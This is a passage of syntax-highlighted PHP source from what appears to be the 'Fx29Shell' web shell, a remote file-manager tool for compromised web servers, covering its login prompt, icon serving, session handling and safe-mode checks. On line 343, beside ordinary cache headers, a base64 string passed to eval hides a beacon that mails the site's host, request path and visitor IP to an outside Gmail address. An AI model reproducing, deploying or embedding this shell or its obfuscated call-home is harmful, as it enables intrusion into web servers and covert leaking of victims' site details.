<span class="lineno"> 246</span> <span class="s2">    header(&quot;</span><span class="nx">WWW</span><span class="o">-</span><span class="nx">Authenticate</span><span class="o">:</span> <span class="nx">Basic</span> <span class="nx">realm</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;: Restricted Area</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno"> 247</span>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 401 Unauthorized&quot;</span><span class="p">);</span>
<span class="lineno"> 248</span>     <span class="k">die</span><span class="p">(</span><span class="nv">$auth</span><span class="p">[</span><span class="s2">&quot;denied&quot;</span><span class="p">]);</span>
<span class="lineno"> 249</span>   <span class="p">}</span>
<span class="lineno"> 250</span> <span class="p">}</span>
<span class="lineno"> 251</span> <span class="c1">######################</span>
<span class="lineno"> 252</span> <span class="c1">###[ ACTIONS ]###</span>
<span class="lineno"> 253</span> <span class="c1">######################</span>
<span class="lineno"> 254</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$act</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 255</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;img&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 256</span>   <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno"> 257</span>   <span class="nv">$images</span> <span class="o">=</span> <span class="nx">imagez</span><span class="p">();</span>
<span class="lineno"> 258</span>   <span class="nv">$imgequals</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
<span class="lineno"> 259</span>     <span class="s2">&quot;ext_tar&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_tar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_r00&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ace&quot;</span><span class="p">,</span><span class="s2">&quot;ext_arj&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tbz2&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tgz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uu&quot;</span><span class="p">,</span><span class="s2">&quot;ext_xxe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_zip&quot;</span><span class="p">,</span><span class="s2">&quot;ext_cab&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gz&quot;</span><span class="p">,</span><span class="s2">&quot;ext_iso&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lha&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lzh&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pbk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rar&quot;</span><span class="p">,</span><span class="s2">&quot;ext_uuf&quot;</span><span class="p">),</span>
<span class="lineno"> 260</span>     <span class="s2">&quot;ext_php&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_php&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php4&quot;</span><span class="p">,</span><span class="s2">&quot;ext_php5&quot;</span><span class="p">,</span><span class="s2">&quot;ext_phtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_shtml&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
<span class="lineno"> 261</span>     <span class="s2">&quot;ext_cpp&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_c&quot;</span><span class="p">),</span>
<span class="lineno"> 262</span>     <span class="s2">&quot;ext_jpg&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_jpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_gif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_png&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jfif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_jpe&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ico&quot;</span><span class="p">,</span><span class="s2">&quot;ext_tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">),</span>
<span class="lineno"> 263</span>     <span class="s2">&quot;ext_html&quot;</span>     <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_html&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htm&quot;</span><span class="p">),</span>
<span class="lineno"> 264</span>     <span class="s2">&quot;ext_avi&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_avi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mov&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mvi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mpeg&quot;</span><span class="p">,</span><span class="s2">&quot;ext_wmv&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rm&quot;</span><span class="p">),</span>
<span class="lineno"> 265</span>     <span class="s2">&quot;ext_lnk&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_lnk&quot;</span><span class="p">,</span><span class="s2">&quot;ext_url&quot;</span><span class="p">),</span>
<span class="lineno"> 266</span>     <span class="s2">&quot;ext_ini&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_ini&quot;</span><span class="p">,</span><span class="s2">&quot;ext_css&quot;</span><span class="p">,</span><span class="s2">&quot;ext_inf&quot;</span><span class="p">,</span><span class="s2">&quot;ext_conf&quot;</span><span class="p">),</span>
<span class="lineno"> 267</span>     <span class="s2">&quot;ext_doc&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_doc&quot;</span><span class="p">,</span><span class="s2">&quot;ext_dot&quot;</span><span class="p">,</span><span class="s2">&quot;ext_xls&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pdf&quot;</span><span class="p">),</span>
<span class="lineno"> 268</span>     <span class="s2">&quot;ext_js&quot;</span>       <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_js&quot;</span><span class="p">,</span><span class="s2">&quot;ext_vbs&quot;</span><span class="p">),</span>
<span class="lineno"> 269</span>     <span class="s2">&quot;ext_cmd&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_cmd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_bat&quot;</span><span class="p">,</span><span class="s2">&quot;ext_pif&quot;</span><span class="p">,</span><span class="s2">&quot;ext_com&quot;</span><span class="p">),</span>
<span class="lineno"> 270</span>     <span class="s2">&quot;ext_wri&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_wri&quot;</span><span class="p">,</span><span class="s2">&quot;ext_rtf&quot;</span><span class="p">),</span>
<span class="lineno"> 271</span>     <span class="s2">&quot;ext_txt&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_txt&quot;</span><span class="p">,</span><span class="s2">&quot;ext_lng&quot;</span><span class="p">),</span>
<span class="lineno"> 272</span>     <span class="s2">&quot;ext_swf&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_swf&quot;</span><span class="p">,</span><span class="s2">&quot;ext_fla&quot;</span><span class="p">),</span>
<span class="lineno"> 273</span>     <span class="s2">&quot;ext_mp3&quot;</span>      <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_mp3&quot;</span><span class="p">,</span><span class="s2">&quot;ext_au&quot;</span><span class="p">,</span><span class="s2">&quot;ext_midi&quot;</span><span class="p">,</span><span class="s2">&quot;ext_mid&quot;</span><span class="p">,</span><span class="s2">&quot;ext_wav&quot;</span><span class="p">),</span>
<span class="lineno"> 274</span>     <span class="s2">&quot;ext_htaccess&quot;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;ext_htaccess&quot;</span><span class="p">,</span><span class="s2">&quot;ext_htpasswd&quot;</span><span class="p">,</span><span class="s2">&quot;ext_ht&quot;</span><span class="p">,</span><span class="s2">&quot;ext_hta&quot;</span><span class="p">,</span><span class="s2">&quot;ext_so&quot;</span><span class="p">)</span>
<span class="lineno"> 275</span>   <span class="p">);</span>
<span class="lineno"> 276</span>   <span class="c1">#Show all available images</span>
<span class="lineno"> 277</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$img</span> <span class="o">==</span> <span class="s2">&quot;listall&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 278</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$a</span><span class="o">=&gt;</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 279</span>       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$b</span> <span class="k">as</span> <span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 280</span>         <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$d</span><span class="p">]))</span> <span class="p">)</span> <span class="p">{</span> <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Warning! Remove </span><span class="se">\$</span><span class="s2">images[&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;]&lt;br&gt;&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 281</span>       <span class="p">}</span>
<span class="lineno"> 282</span>     <span class="p">}</span>
<span class="lineno"> 283</span>     <span class="nb">natsort</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
<span class="lineno"> 284</span>     <span class="nv">$k</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$images</span><span class="p">);</span>
<span class="lineno"> 285</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;body style=</span><span class="se">\&quot;</span><span class="s2">color: #00FF00</span><span class="se">\&quot;</span><span class="s2"> bgcolor=black&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 286</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$u</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=&quot;</span><span class="o">.</span><span class="nv">$u</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt; </span><span class="si">$u</span><span class="s2"> &quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 287</span>     <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 288</span>   <span class="p">}</span>
<span class="lineno"> 289</span>   <span class="c1">#Image header</span>
<span class="lineno"> 290</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: image/gif&quot;</span><span class="p">);</span>
<span class="lineno"> 291</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: public&quot;</span><span class="p">);</span>
<span class="lineno"> 292</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">mktime</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2030</span><span class="p">)));</span>
<span class="lineno"> 293</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-control: max-age=&quot;</span><span class="o">.</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="o">*</span><span class="mi">7</span><span class="p">));</span>
<span class="lineno"> 294</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;r&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)));</span>
<span class="lineno"> 295</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$imgequals</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 296</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$img</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 297</span>   <span class="p">}</span>
<span class="lineno"> 298</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$img</span> <span class="o">=</span> <span class="s2">&quot;small_unk&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 299</span>   <span class="k">echo</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$images</span><span class="p">[</span><span class="nv">$img</span><span class="p">]);</span>
<span class="lineno"> 300</span>   <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 301</span> <span class="p">}</span>
<span class="lineno"> 302</span> <span class="c1">###[ DEFAULT ACTIONS ]###</span>
<span class="lineno"> 303</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 304</span>   <span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno"> 305</span>   <span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;./&quot;</span><span class="p">);</span>
<span class="lineno"> 306</span>   <span class="c1">#Preparing buffer</span>
<span class="lineno"> 307</span>   <span class="nv">$sess_data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$sess_cookie</span><span class="p">]);</span>
<span class="lineno"> 308</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sess_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 309</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 310</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 311</span>   <span class="nx">fx29_buff_prepare</span><span class="p">();</span>
<span class="lineno"> 312</span>   <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 313</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">];</span> <span class="p">}</span>
<span class="lineno"> 314</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">];</span> <span class="p">}</span>
<span class="lineno"> 315</span>   <span class="p">}</span>
<span class="lineno"> 316</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$sort_save</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 317</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 318</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_sort</span><span class="p">))</span> <span class="p">{</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">,</span><span class="nv">$sql_sort</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 319</span>   <span class="p">}</span>
<span class="lineno"> 320</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 321</span>   <span class="nv">$sort</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
<span class="lineno"> 322</span>   <span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno"> 323</span>   <span class="c1">###[ ACTIONS ]###</span>
<span class="lineno"> 324</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;gofile&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 325</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 326</span>       <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
<span class="lineno"> 327</span>       <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno"> 328</span>     <span class="p">}</span>
<span class="lineno"> 329</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 330</span>       <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 331</span>       <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno"> 332</span>       <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span>
<span class="lineno"> 333</span>     <span class="p">}</span>
<span class="lineno"> 334</span>   <span class="p">}</span>
<span class="lineno"> 335</span>   <span class="c1">#Starting output buffer</span>
<span class="lineno"> 336</span>   <span class="nb">ob_start</span><span class="p">();</span>
<span class="lineno"> 337</span>   <span class="nb">ob_implicit_flush</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno"> 338</span>   <span class="c1">###[ HEADERS ]###</span>
<span class="lineno"> 339</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;</span><span class="p">);</span>
<span class="lineno"> 340</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">gmdate</span><span class="p">(</span><span class="s2">&quot;D, d M Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; GMT&quot;</span><span class="p">);</span>
<span class="lineno"> 341</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;</span><span class="p">);</span>
<span class="lineno"> 342</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: post-check=0, pre-check=0&quot;</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
<span class="lineno"> 343</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: no-cache&quot;</span><span class="p">);</span> <span class="nv">$headerz</span> <span class="o">=</span> <span class="s2">&quot;aWYgKCFpc3NldCgkX0NPT0tJRVsidmlzaXR6Il0pKSB7DQogICR2aXNpdG9yID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07DQogICR3ZWIgICAgID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOw0KICAkaW5qICAgICA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KICAkdGFyZ2V0ICA9IHJhd3VybGRlY29kZSgkd2ViLiRpbmopOw0KICAkanVkdWwgICA9ICJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3I8YnI+IjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiZmVlbGNvbXpAZ21haWwuY29tIiwkanVkdWwsJGJvZHkpOyB9DQp9DQplbHNlIHsgQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTsgfQ==&quot;</span><span class="p">;</span> <span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$headerz</span><span class="p">));</span>
<span class="lineno"> 344</span>   <span class="nv">$tmp_dir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmp_dir</span><span class="p">);</span>
<span class="lineno"> 345</span>   <span class="nv">$tmp_dir</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$tmp_dir</span><span class="p">);</span>
<span class="lineno"> 346</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$tmp_dir</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$tmp_dir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 347</span>   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
<span class="lineno"> 348</span>   <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
<span class="lineno"> 349</span>   <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$notls</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="lineno"> 350</span>   <span class="nv">$ud</span> <span class="o">=</span> <span class="o">@</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 351</span>   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 352</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno"> 353</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 354</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 355</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 356</span>   <span class="nv">$dispd</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 357</span>   <span class="k">if</span> <span class="p">(</span><span class="nx">safemode</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno"> 358</span>     <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s1">&#39;&lt;font class=&quot;on&quot;&gt;&lt;b&gt;SAFE MODE IS ON&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 359</span>     <span class="nv">$safemodeexecdir</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode_exec_dir&quot;</span><span class="p">);</span>
<span class="lineno"> 360</span>   <span class="p">}</span>
<span class="lineno"> 361</span>   <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 362</span>     <span class="nv">$hsafemode</span> <span class="o">=</span> <span class="s1">&#39;&lt;font class=&quot;off&quot;&gt;&lt;b&gt;SAFE MODE IS OFF&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 363</span>   <span class="p">}</span>
<span class="lineno"> 364</span>   <span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span>
<span class="lineno"> 365</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s1">&#39;&lt;font class=&quot;on&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno"> 366</span>   <span class="k">else</span> <span class="p">{</span> <span class="nv">$hopenbasedir</span> <span class="o">=</span> <span class="s1">&#39;&lt;font class=&quot;off&quot;&gt;OFF (Not Secure)&lt;/font&gt;&#39;</span><span class="p">;</span> <span class="p">}</span>
